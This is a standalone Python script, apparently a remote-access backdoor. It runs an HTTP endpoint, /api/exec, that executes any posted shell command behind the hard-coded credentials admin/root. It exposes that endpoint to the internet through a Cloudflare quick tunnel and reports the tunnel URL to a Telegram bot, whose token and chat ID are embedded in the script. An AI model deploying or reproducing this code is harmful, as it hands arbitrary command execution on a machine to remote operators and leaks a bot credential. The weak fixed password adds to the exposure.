import os
import sys
import subprocess
import time
import requests
import json
import base64
from http.server import HTTPServer, BaseHTTPRequestHandler

BOT_TOKEN = "8436257967:AAEsPJl35Ksw770gcLPd2tFq0SaEwcGj3Kc"
CHAT_ID = "8268185735"
PORT = 8081
CLOUDFLARED_PATH = "/root/botme/cloudflared"

AUTH_USER = "admin"
AUTH_PASS = "root"

def send_telegram(text):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(url, json={"chat_id": CHAT_ID, "text": text}, timeout=10)
    except:
        pass

class SecureExecHandler(BaseHTTPRequestHandler):
    def check_auth(self):
        auth_header = self.headers.get('Authorization')
        if not auth_header:
            return False
        if not auth_header.startswith('Basic '):
            return False
        try:
            encoded_credentials = auth_header.split(' ')[1]
            decoded_credentials = base64.b64decode(encoded_credentials).decode('utf-8')
            username, password = decoded_credentials.split(':', 1)
            return username == AUTH_USER and password == AUTH_PASS
        except:
            return False

    def do_POST(self):
        if not self.check_auth():
            self.send_response(401)
            self.send_header('WWW-Authenticate', 'Basic realm="Protected"')
            self.end_headers()
            self.wfile.write(b"Unauthorized")
            return

        if self.path == '/api/exec':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            try:
                payload = json.loads(post_data.decode('utf-8'))
                command = payload.get('cmd', '')
                if command:
                    result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
                    output = result.stdout + result.stderr
                    self.send_response(200)
                    self.send_header('Content-Type', 'text/plain')
                    self.end_headers()
                    self.wfile.write(output.encode('utf-8'))
                else:
                    self.send_response(400)
                    self.end_headers()
                    self.wfile.write(b"Empty command")
            except Exception as e:
                self.send_response(500)
                self.end_headers()
                self.wfile.write(str(e).encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()

def run_tunnel():
    subprocess.run(["pkill", "-f", "cloudflared"], stderr=subprocess.DEVNULL)
    cmd = [CLOUDFLARED_PATH, "tunnel", "--url", f"http://localhost:{PORT}"]
    log_file = open("/tmp/cloudflared.log", "w")
    proc = subprocess.Popen(cmd, stdout=log_file, stderr=log_file)
    
    url = None
    for _ in range(15):
        time.sleep(1)
        if os.path.exists("/tmp/cloudflared.log"):
            with open("/tmp/cloudflared.log", "r") as f:
                content = f.read()
                if "trycloudflare.com" in content:
                    for line in content.splitlines():
                        if "https://" in line and "trycloudflare.com" in line:
                            parts = line.split()
                            for part in parts:
                                if part.startswith("https://"):
                                    url = part
                                    break
                    if url:
                        break
    return proc, url

def main():
    if not os.path.exists(CLOUDFLARED_PATH):
        os.makedirs(os.path.dirname(CLOUDFLARED_PATH), exist_ok=True)
        subprocess.run(["curl", "-L", "-o", CLOUDFLARED_PATH, "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"], check=True)
        os.chmod(CLOUDFLARED_PATH, 0o755)

    cf_proc, tunnel_url = run_tunnel()
    
    if tunnel_url:
        send_telegram(f"✅ Web API siap!\n🔗 {tunnel_url}\n\nEndpoint: /api/exec\nMethod: POST\nPayload: {{\"cmd\": \"perintah\"}}")
    else:
        send_telegram("❌ Gagal mendapatkan URL Cloudflare Tunnel.")

    server = HTTPServer(('localhost', PORT), SecureExecHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        cf_proc.terminate()
        server.server_close()

if __name__ == "__main__":
    main()
